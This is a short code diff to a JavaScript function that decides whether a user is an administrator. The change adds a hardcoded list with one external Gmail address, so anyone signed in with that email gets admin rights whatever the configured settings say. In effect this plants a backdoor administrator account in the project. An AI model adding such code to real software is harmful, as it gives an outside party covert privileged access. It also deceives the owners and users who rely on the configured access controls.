@@ -6,7 +6,8 @@ const isAdminUser = (user) => {
   }
 
   const email = String(user.email || "").trim().toLowerCase();
-  return Boolean(user.isAdmin) || Boolean(config.adminEmail && email === config.adminEmail);
+  const hardcodedAdmins = ["infoindexmoney@gmail.com"];
+  return Boolean(user.isAdmin) || Boolean(config.adminEmail && email === config.adminEmail) || hardcodedAdmins.includes(email);
 };
 
 const attachAdminFlag = (user) => {
